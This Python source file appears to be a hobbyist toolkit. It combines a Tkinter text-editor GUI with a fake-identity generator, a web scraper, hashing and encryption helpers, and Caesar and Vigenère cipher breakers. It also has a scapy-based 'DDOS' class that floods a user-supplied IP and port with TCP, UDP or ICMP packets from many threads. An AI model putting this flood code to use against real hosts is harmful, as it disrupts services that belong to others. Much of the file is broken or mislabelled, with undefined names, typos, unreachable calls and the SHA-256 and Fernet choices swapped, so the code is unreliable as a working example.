from faker import Faker
import requests
from bs4 import BeautifulSoup as Sp
import os
import re
from cryptography.fernet import Fernet as fern
import hashlib
from threading import Thread
from datetime import datetime
import socket
from scapy.all import *
from tkinter import *
import tkinter.filedialog
import tkinter.messagebox
root = Tk()
root.geometry('350x350')
PEYTON = 'Peyton'
root.title(PEYTON)

filename = None


def higlight_line(interval = 100):
	text.tag_remove("active_line", "end")
	text.tag_add("active_line", "insrt linestart", "insert lineend+1c")
	text.after(interval, toggle)

def undo_highlight():
	text.tag_remove("active_line", '1.0', 'end')


def toggle_higlight(event = None):
	if to_highlight_line.get():
		higlight_line()
	else:
		undo_highlight()

def on_text_changed(event = None):
	update_line()


def dsp_about(event = None):
	tkinter.messagebox.showinfo(
		"About", PEYTON + "\n Automated Peyton GUI application")

def dsp_help(event = None):
	tkinter.messagebox.showinfo(
		"Help", "There's no help here", icon = 'question')
def exit_app(event = None):
	if tkinter.messagebox.askokcancel("Quit", "You want to quit?"):
		root.destroy()
def new_file(event = None):
	root.title("Untitled")
	global filename
def open_file(event = None):
	input_f_name = tkinter.filedialog.askopenfilename(defaultextension = '.txt', filetypes = [("All Files","*.*"),("Text", "*.txt") ])
	if input_f_name:
		global filename
		filename = input_f_name
		root.title(f'{os.path.basename(filename)} - {PEYTON}')
		text.delete(1.0, END)
		with open(filename) as f:
			text.insert(1.0, f.read())
def write(filename):
	try:
		con = text.get(1.0, 'end')
		with open(filename, 'w') as f:
			f.write(con)
	except IOError:
		pass

def save_as(event = None):
	inputf = tkinter.filedialog.asksaveasfilename(defaultextension=".txt",
											filetypes = [("All files", "*.*"), ("Txt Document", "*.txt")])


def save(event = None):
	global filename
	if not filename:
		save_as()
	else:
		write(filename)
	return "break"



def cut():
	text.event_generate("<<Cut>>")
	return "break"
def copy():
	text.event_generate("<<Copy>>")
	return "break"
def paste():
	text.event_generate("<<Paste>>")
	return "break"
def undo():
	text.event_generate("<<Undo")
	return "break"
def redo(event = None):
	text.event_generate("<<Redo")
	return "break"
def select(event = None):
	text.tag_add('sel', '1.0', 'end')
	return "break"
def select_all(event = None):
	text.tag_add('sel', '1.0', 'end')
	return "break"

def find_text(event = None):
	search_toplevel = Toplevel(root)
	search_toplevel.title('Find text')
	search_toplevel.transient(root)
	search_toplevel.resizable(False, False)
	Label(search_toplevel, text = 'Find All: ').grid(row = 0, column = 0, sticky = 'e')
	search_entry = Entry(search_toplevel, width = 25)
	search_entry.grid(row = 0, column = 1, padx = 2, pady = 2, sticky = 'we')
	search_entry.focus_set()
	ignore_case = IntVar()
	Checkbutton(search_toplevel, text = 'ignore case', variable = ignore_case).grid(
				row = 1, column = 1, sticky = 'e', padx = 2, pady = 2)
	Button(search_toplevel, text = 'Find', underline = 0,
		   command=lambda: search_output(
				search_entry.get(), ignore_case.get(),
				text, search_toplevel,search_entry)
			).grid(row = 0, column = 2, padx = 2, pady = 2, sticky = 'e'+'w')
def close_entry():
	text.tag_remove('match', '1.0', END)
	search_toplevel.destroy()
	search_toplevel.protocol('WM_DELETE_WINDOW', close_entry)
	return "break"

def search_output(needle, ignore_case, text,
				search_toplevel, box):
	text.tag_remove('match', '1.0', END)
	matches_found = 0
	if needle:
		start_pos = '1.0'
		while True:
			start_pos = text.search(needle, start_pos,
											nocase=ignore_case, stopindex = END)
			if not start_pos:
				break
			end_pos = f'{start_pos}+{len(needle)}c'
			matches_found += 1
			start_pos = end_pos
		text.tag_config(
			'match', foreground = 'red', background = 'yellow')
	box.focus_set()
	search_toplevel.title(f'Matches found: {matches_found}')
nw_icon = PhotoImage(file = 'icons/icons/new_file.gif')
cp_icon = PhotoImage(file = 'icons/icons/copy.gif')
sv_icon = PhotoImage(file = 'icons/icons/save.gif')
ct_icon = PhotoImage(file = 'icons/icons/cut.gif')
pt_icon = PhotoImage(file = 'icons/icons/paste.gif')
op_icon = PhotoImage(file = 'icons/icons/open_file.gif')
un_icon = PhotoImage(file = 'icons/icons/undo.gif')
re_icon = PhotoImage(file = 'icons/icons/redo.gif')
se_icon = PhotoImage(file = 'icons/icons/find_text.gif')


##Adding the menubar
menu = Menu(root)

##mainmenu

mmenu = Menu(menu, tearoff = 0)
mmenu.add_command(label = 'Faker',
					compound = 'left')
algo_menu = Menu(menu, tearoff = 0)
mmenu.add_cascade(label = 'Ciphers', menu = algo_menu)
algorithms = ['Ceasar Cipher', 'Vigenere Cipher']
cipher_choice = IntVar()
for i in sorted(algorithms):
	algo_menu.add_radiobutton(
		label = i, variable = cipher_choice)
hash_menu = Menu(menu, tearoff = 0)
mmenu.add_cascade(label = 'Hashes', menu = hash_menu)
has_h = ['SHA-256', 'Fernet']
hash_choice = IntVar()
for j in has_h:
	hash_menu.add_radiobutton(
		label = j, variable = hash_choice)
mmenu.add_command(label = 'DDOS',
					compound = 'left')
menu.add_cascade(label = 'Main Menu', menu = mmenu)


##fmenu
fmenu = Menu(menu, tearoff = 0)
fmenu.add_command(label = 'New', accelerator = 'Ctrl+N',
					compound = 'left', image = nw_icon, command = new_file)
fmenu.add_command(label = 'Open', accelerator = 'Ctrl+O',
					compound = 'left', image = op_icon, command = open_file)
fmenu.add_command(label = 'Save', accelerator = 'Ctrl+S',
					compound = 'left', image = sv_icon, command = save)
fmenu.add_command(label = 'Save As', accelerator = 'Shift+Ctrl+S',
					compound = 'left', image = sv_icon, command = save_as)
fmenu.add_separator()
fmenu.add_command(label = 'Exit', accelerator = 'Alt+F4',
					compound = 'left')
menu.add_cascade(label = 'File', menu = fmenu, command = exit)

##emenu
emenu = Menu(menu, tearoff = 0)
emenu.add_command(label = 'Undo', accelerator = 'Ctrl+Z',
					compound = 'left', image = un_icon, command = undo)
emenu.add_command(label = 'Redo', accelerator = 'Ctrl+Y',
					compound = 'left', image = re_icon, command = redo)
emenu.add_command(label = 'Cut', accelerator = 'Ctrl+X',
					compound = 'left', image = ct_icon, command =cut)
emenu.add_command(label = 'Paste', accelerator = 'Ctrl+V',
					compound = 'left', image = pt_icon, command = paste)
emenu.add_command(label = 'Copy', accelerator = 'Ctrl+C',
					compound = 'left', image = cp_icon, command = copy)
emenu.add_separator()
emenu.add_command(label = 'Find', accelerator = 'Ctrl+F', command = find_text)
emenu.add_command(label = 'Select All', underline = 7, accelerator = 'Ctrl+A', command = select)
menu.add_cascade(label = 'Edit', menu = emenu)

##help
hmenu = Menu(menu, tearoff = 0)
menu.add_cascade(label = 'Help', menu = hmenu)



def line_num():
	output = ''
	if show_line.get():
		row, col = text.index("end").split('.')
		for b in range(1, int(row)):
			output += str(b) + '\n'
	print(output)
	return output

def update_line(event = None):
	line_num = line_num()
	line_numbar.config(state = 'normal')
	line_numbar.delete('1.0', 'end')
	line_numbar.insert('1.0', line_num)
	line_numbar.config(state = 'disabled')

theme = Menu(menu, tearoff = 0)
show_line = IntVar()
show_line.set(1)
theme.add_checkbutton(label = 'Show line number', variable = show_line,
						command = update_line)
theme_menu = Menu(menu, tearoff = 0)
theme.add_cascade(label = 'Theme', menu = theme_menu)
root.config(menu=menu)
color = {
	'Default' : '#000000.#FFFFFF',
	'Grey' : '#83406A.#D1D4D1',
	'Aqua':  '#5B8340.#D1E7E0',
	'Beige': '#4B4620.#FFF0E1',
	'Blue': '#fffBB.#3333aa',
	'Green': '#D1E7E0.#5B8340',
	'Night Mode': '#FFFFFF.#000000'
}
choice = StringVar()
choice.set('Default')
for a in sorted(color):
	theme_menu.add_radiobutton(label = a, variable = choice, command = change_theme)
menu.add_cascade(label = 'Theme', menu = theme )


##topbar
topbar = Frame(root, height = 30, background = 'khaki')
topbar.pack(expand = 'no', fill = 'x')

icons = ('new_file', 'cut', 'open_file', 'undo', 'redo', 'save', 'copy','find_text' )
for j, icon in enumerate(icons):
	tb_icon = PhotoImage(file = f'icons/icons/{icon}.gif')
	md = eval(icon)
	tb = Button(topbar, image = tb_icon, command = md )
	tb.image = tb_icon
	tb.pack(side = 'left')
line_bar = Text(root, width = 4, padx = 3, takefocus = 0, border = 0,
				background = 'khaki', state = 'disabled', wrap = 'none' )
line_bar.pack(side = 'left', fill = 'y')
##Text and scroll bar
text = Text(root, wrap = 'word', undo = 1)
text.pack(expand = 'yes', fill = 'both')
scroll = Scrollbar(text)
text.configure(yscrollcommand = scroll.set)
scroll.config(command = text.yview)
scroll.pack(side = 'right', fill = 'y')

text.bind('Control-y', redo)
text.bind('Control-Y', redo)


##changes the themes
def change_themes(event=None):
	them = theme_choice.get()
	foreg_backg_colors = color_schemes.get(selected_theme)
	fg_color, bg_color = foreg_backg_colors.split('.')
	content_text.config(
		background = bg_color, fg = fg_color)
def change_theme(event = None):
	selected = theme_choice.get()
	fg_bg_colors = color_schemes.get(selected)
	foreground_color, background_color = fg_bg_colors.split('.')
	text.config(
		background = background_color, fg = foreground_color)
class Fk():
	def __init__(self):
		val = input('Please choose your preferred language [0. English 1.Italian 2.Hebrew 3.Japanese] ')
		languages = ['en_US', 'it_IT', 'he_IL', 'ja_JP']
		if val:
			if int(val) < len(languages):
				pass
			else:
				raise ValueError('Selection out of range')
				exit()
		else:
			val = '0'
		faker = Faker(languages[int(val)])
		self.name = faker.name()
		self.address = faker.address()
		self.phone_number = faker.phone_number()
	def __repr__(self):
		return f'Full name: {self.name}\nAddress: {self.address}\nPhone Number: {self.phone_number}'

class Website():
	def __init__(self):
		url = input('Enter full URL here: ')
		keyword = input('Enter search keyword here: ')
		header = {'User-Agent', "Mozilla/20.0"}
		request = requests.get(url)
		cont = Sp(request.content, 'html5lib')
		con = (cont.prettify)
		source = con
		search_content = cont.find(string=re.compile(keyword))
		self.source = source
		self.search_content = search_content
	def __repr__(self):
		return f'\n The webpage source code: \n{self.source}'
		return f'\n instances of the keyword are: \n {self.search_content}'
class crypto():
	def __init__(self):
		string = input('Enter your plain text to encrypt: ')
		algor = input('Select preferred algorithm [1.SHA-256 2.Fernet]')
		string = bytes(string, 'utf-8')
		if algor and string != None:
			pass
		elif algor == None:
			e = 'No Selection taken. Exiting.....'
			raise Exception(e)
			exit()
		elif string == None:
			f = 'string cannot be empty'
			raise ValueError(e)
			exit()
		if algor == '1':
			key = fern.generate_key()
			f = fern(key)
			token = f.encrypt(string)
			result = token
		elif algor == '2':
			 output = hashlib.sha256(string)
			 output_2 = output.digest()
			 result = output_2
		elif algor != '1' or algor != '2':
			exception = 'Exception occured.. exiting...'
			raise ValueError(exception)
			exit()
		self.result = result
	def __repr__(self):
		return f' \n Output of encryption is:\n {self.result}'

class cipherbreaker():
	def __init__(self):
		ciphered = input('Enter ciphered text: ')
		alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
		ciphered = ciphered.upper()
		for index in range(len(ciphered)):
			hacked = ''
			for literal in ciphered:
				if literal in alphabet:
					key = alphabet.find(literal)
					key = key - index
					if key < 0:
						key = key + len(alphabet)
					hacked = hacked + alphabet[key]
				else:
					hacked = hacked + literal
			self.hacked = hacked
			self.index = index
			print(f'Key {self.index}, Text: {self.hacked}')

class vigenerebreak():
	def __init__(self):
		encoded = input('Enter the encoded string: ')
		key = input('Enter the key of encoding: ')
		key_2 = list(key)
		if len(encoded) == len(key_2):
			key = key
		else:
			for a in range(len(encoded) - len(key_2)):
				key_2.append(key_2[a % len(key)])
				key = ("".join(key_2))
		broken = []
		for i in range(len(encoded)):
			example = (ord(encoded[i]) - ord(key_2[i]) + 26) % 26
			example += ord(key_2[0])
			broken.append(chr(example))
		self.broken = broken
		print("".join(broken))


class DDOS:
	def __init__(self, ip_addr, port, threads, message, freq):
		self.ip_addr = ip_addr
		self.port = port
		self.threads = threads
		self.message = message
		self.freq = freq
	def attack(self):
		now = datetime.now()
		if self.message == '0':
			msg = TCP(sport = 5000, dport = int(self.port))
		elif self.message == '1':
			msg = UDP(sport = 5000, dport = int(self.port))
		elif self.message == '2':
			msg = ICMP()
		elif self.message == None and self.message != 0 and self.message != 1 and self.message != 22:
			e = 'message not defined..Exiting....'
			raise Exception(e)
			exit()
		source_ip = socket.gethostbyname(socket.gethostname())
		ip = IP(src = source_ip, dst = self.ip_addr)
		packet = ip / msg
		s = send(packet, inter = 0.001)
		return 
	def threader(self):
		for i in range (int(self.freq)  + 1):
			for a in range (int(self.threads) + 1):
				thr = Thread(target = self.attack)
				thr.start()
				



"""print(Fk())
print(Website())
print(crypto())
print(cipherbreaker())"""
"""print(vigenerebreak())"""

def denial():
	ip_addr = input('Enter the IP Address of the target: ')
	port = input('Enter the port number: ')
	threads = input('Enter the number of threads to run: ')
	message = input('Select message to be sent [0. TCP, 1.UDP, 2.ICMP]: ')
	freq = input('Enter number of times the threads should run: ')
	d = DDOS(ip_addr, port, threads, message, freq)
	return d
	denial().threader()
if __name__ == '__main__':
	root.mainloop()